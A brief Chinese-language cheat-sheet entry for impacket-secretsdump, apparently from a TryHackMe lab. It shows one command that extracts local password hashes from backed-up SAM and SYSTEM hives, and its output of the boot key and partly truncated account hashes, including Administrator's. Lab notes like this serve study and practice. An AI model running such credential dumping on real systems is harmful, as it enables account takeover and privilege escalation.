# impacket-secretsdump

## 使用範例
### 取得 admin
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ impacket-secretsdump -ts local -sam sam.bak -system system.bak
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-10-31 15:50:48] [*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[2025-10-31 15:50:48] [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aa...7a:::
Guest:501:aad...c0:::
DefaultAccount:50...9c0:::
WDAGUtilityAccount:504...11b:::
Jareth:1001:aad...5a:::
[2025-10-31 15:50:48] [*] Cleaning up... 
```